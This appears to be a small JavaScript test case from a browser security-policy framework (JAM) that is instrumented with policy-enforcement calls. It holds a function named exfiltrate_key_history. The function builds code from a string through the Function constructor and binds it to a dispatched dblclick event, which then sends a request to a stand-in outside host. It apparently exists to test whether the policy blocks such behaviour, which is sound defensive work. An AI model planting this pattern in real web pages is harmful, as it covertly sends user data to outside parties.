
JAM.startProfile('load');
function exfiltrate_key_history() {
  var exp = 'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=dispatch", true);xmlhttp.send(null);';
  var button = document.getElementById("test");
  var event$$1 = new Event("dblclick");
  var v0 = JAM.call(Function, null, [exp]);
  JAM.call(button.addEventListener, button, ["dblclick", v0, false], JAM.policy.p1);
  button.dispatchEvent(event$$1);
  return;
}
var v1 = document.getElementById("test");
JAM.set(v1, "onclick", exfiltrate_key_history)

JAM.stopProfile('load');
